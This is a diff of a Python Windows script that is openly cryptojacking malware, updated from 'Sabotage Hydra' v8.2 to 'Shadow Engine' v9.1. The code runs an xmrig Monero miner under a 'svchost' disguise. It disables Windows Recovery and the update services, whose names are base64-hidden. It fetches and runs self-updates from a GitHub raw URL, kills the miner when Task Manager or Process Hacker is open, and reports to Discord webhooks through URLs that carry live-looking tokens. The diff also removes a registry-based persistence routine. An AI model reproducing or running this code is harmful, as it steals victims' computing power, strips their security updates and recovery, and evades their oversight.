@@ -1,7 +1,7 @@
 import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading, base64
 from urllib import request
 
-# --- CONFIG (V8.2 - THE SABOTAGE HYDRA) ---
+# --- CONFIG (V9.1 - TRUE SHADOW ENGINE) ---
 W_S = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
 W_M = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPvYeiAfT9nIB25FPR4k-MoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
 ID = "svchost"
@@ -10,8 +10,6 @@ MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 RAW_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
-
-# Services to lock down (Windows Update, BITS, Delivery Optimization)
 SVC_L = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="] 
 
 def notify(msg, type="sys"):
@@ -33,22 +31,18 @@ def auto_update():
             if new_code != current_code:
                 with open(os.path.realpath(__file__), 'w') as f:
                     f.write(new_code)
-                notify("Evolution triggered. Restarting engine.", "sys")
+                notify("Evolution triggered. Shadow Engine updated.", "sys")
                 os.execv(sys.executable, ['python'] + sys.argv)
         except: pass
 
 def engage_locks():
-    """V6.3 Sabotage Logic: Disable Recovery and Update Services"""
+    """Sabotage Logic: Disable Recovery and Update Services"""
     try:
-        # Disable Windows Recovery Environment
         subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
-        
-        # Disable Update Services
         for s in SVC_L:
             name = base64.b64decode(s).decode()
             subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=0x08000000)
             subprocess.run(["sc", "stop", name], capture_output=True, creationflags=0x08000000)
-        notify("System Lockdown Verified (Recovery/Updates Disabled).", "sys")
     except: pass
 
 def is_running(name):
@@ -56,15 +50,6 @@ def is_running(name):
         output = subprocess.check_output(['tasklist', '/NH', '/FO', 'CSV', '/FI', f'IMAGENAME eq {name}'], creationflags=0x08000000).decode()
         return name.lower() in output.lower()
     except: return False
-
-def engage_persistence():
-    try:
-        run_p = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_p, 0, winreg.KEY_SET_VALUE)
-        # Pointing to the ctfmon mask
-        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.realpath(__file__)}"')
-        winreg.CloseKey(key)
-    except: pass
 
 class LASTINPUTINFO(ctypes.Structure):
     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
@@ -77,24 +62,29 @@ def get_idle():
     return 0
 
 def manage():
-    if is_running("Taskmgr.exe"):
+    # Kill engine if monitor tools are detected
+    if is_running("Taskmgr.exe") or is_running("ProcessHacker.exe"):
         subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], creationflags=0x08000000, capture_output=True)
     else:
         idle = get_idle()
-        pwr = "90" if idle > 300 else "25"
+        # 90% power if idle > 5 mins, 30% during active use
+        pwr = "90" if idle > 300 else "30"
+        
         if not is_running("xmrig.exe") and os.path.exists(MIN_BIN):
-            subprocess.Popen([MIN_BIN, "-o", POOL, "-u", f"{WALLET}.{platform.node()}", "--max-cpu-usage", pwr, "-k", "--tls"], creationflags=0x08000000)
+            subprocess.Popen([
+                MIN_BIN, "-o", POOL, "-u", f"{WALLET}.{platform.node()}", 
+                "--max-cpu-usage", pwr, "-k", "--tls"
+            ], creationflags=0x08000000)
             notify(f"Engine Engaged. Power: {pwr}%", "mine")
 
 def main():
     threading.Thread(target=auto_update, daemon=True).start()
-    engage_locks() # Teeth Engaged
-    time.sleep(random.randint(5, 15))
-    engage_persistence()
-    notify("SYSTEM ONLINE (v8.2 - Sabotage Hydra Active)", "sys")
+    engage_locks()
+    time.sleep(random.randint(10, 25))
+    notify("SHADOW HYDRA v9.1 ONLINE (30/90 Optimized)", "sys")
     while True:
         manage()
-        time.sleep(15)
+        time.sleep(20)
 
 if __name__ == "__main__":
     main()
